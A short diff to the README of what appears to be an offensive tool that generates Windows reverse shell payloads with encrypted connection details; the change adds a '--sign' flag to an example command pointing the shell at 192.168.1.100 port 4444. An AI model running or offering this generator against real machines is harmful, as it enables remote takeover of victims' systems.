@@ -18,7 +18,7 @@ This tool generates a Windows reverse shell payload with **AES-encrypted IP and 
 
 ### Basic Example
 ```bash
-python3 payload_gen.py --ip 192.168.1.100 --port 4444 --notepad
+python3 payload_gen.py --ip 192.168.1.100 --port 4444 --notepad --sign
 ```
   
 ### Arguments
